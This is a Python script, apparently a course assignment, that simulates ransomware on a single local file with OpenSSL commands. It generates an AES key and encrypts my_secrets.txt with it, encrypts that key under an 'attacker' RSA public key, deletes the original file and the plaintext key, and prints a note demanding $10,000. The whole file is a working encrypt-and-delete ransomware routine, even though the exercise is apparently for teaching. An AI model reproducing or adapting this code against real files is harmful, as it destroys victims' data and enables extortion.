#!/usr/bin/env python3
# ------------------------------------------------------------
# Q4
# ------------------------------------------------------------
import os
import subprocess
import sys
from datetime import datetime

def run(cmd, **kwargs):
    """Execute *cmd* (list), raise on error, and print the command.

    If the caller provides ``stdout`` or ``stderr`` we use those,
    otherwise we default to PIPE so we can echo the output.
    """
    print("[+] RUN :", " ".join(cmd))
    user_stdout = kwargs.pop("stdout", subprocess.PIPE)
    user_stderr = kwargs.pop("stderr", subprocess.PIPE)

    result = subprocess.run(
        cmd,
        stdout=user_stdout,
        stderr=user_stderr,
        text=True,
        check=True,
        **kwargs,
    )
    if result.stdout:
        print(result.stdout.strip())
    if result.stderr:
        print(result.stderr.strip())
    return result

# ----------------------------------------------------------------------
def generate_symmetric_key():
    # openssl rand -base64 16 > key.txt
    with open("key.txt", "w") as f:
        run(["openssl", "rand", "-base64", "16"], stdout=f)
    print("[+] Symmetric key generated → key.txt")

# ----------------------------------------------------------------------
def generate_rsa_keys():
    # private key
    run(["openssl", "genrsa", "-out", "attacker_private.pem", "2048"])
    # public key
    run(
        [
            "openssl",
            "rsa",
            "-pubout",
            "-in",
            "attacker_private.pem",
            "-out",
            "attacker_pub.pem",
        ]
    )
    print("[+] RSA key‑pair generated (attacker_private.pem / attacker_pub.pem)")

# ----------------------------------------------------------------------
def encrypt_secret():
    # openssl enc -aes-256-cbc -salt -in my_secrets.txt \
    #          -out data_cipher.txt -pass file:./key.txt -base64
    run(
        [
            "openssl",
            "enc",
            "-aes-256-cbc",
            "-salt",
            "-in",
            "my_secrets.txt",
            "-out",
            "data_cipher.txt",
            "-pass",
            "file:./key.txt",
            "-base64",
        ]
    )
    print("[+] my_secrets.txt encrypted → data_cipher.txt (base64)")

# ----------------------------------------------------------------------
def encrypt_key():
    # encrypt symmetric key with RSA public key → binary ciphertext
    run(
        [
            "openssl",
            "rsautl",
            "-encrypt",
            "-inkey",
            "attacker_pub.pem",
            "-pubin",
            "-in",
            "key.txt",
            "-out",
            "key_cipher.bin",
        ]
    )
    # base64‑encode the binary ciphertext
    with open("key_cipher.txt", "w") as out_f:
        run(["base64", "key_cipher.bin"], stdout=out_f)
    print("[+] Symmetric key encrypted → key_cipher.txt (base64)")

# ----------------------------------------------------------------------
def cleanup():
    for f in ("key.txt", "my_secrets.txt"):
        try:
            os.remove(f)
            print(f"[+] Deleted {f}")
        except OSError as e:
            print(f"[-] Could not delete {f}: {e}")

# ----------------------------------------------------------------------
def ransom_note():
    note = """
Your file my_secrets.txt is encrypted.
To decrypt it, you need to pay me $10,000 and send key_cipher.txt to me.
"""
    print("\n=== RANSOM NOTE ===")
    print(note.strip())
    print("===================\n")

# ----------------------------------------------------------------------
def main():
    # sanity check – the secret file must exist
    if not os.path.isfile("my_secrets.txt"):
        print("[-] Error: my_secrets.txt not found in the current directory.")
        sys.exit(1)

    generate_symmetric_key()
    generate_rsa_keys()
    encrypt_secret()
    encrypt_key()
    cleanup()
    ransom_note()


if __name__ == "__main__":
    # Header required by the assignment
    print(f"Author: Roshitha")
    print(f"Date:   {datetime.now().strftime('%d/%m/%Y')}\n")
    main()
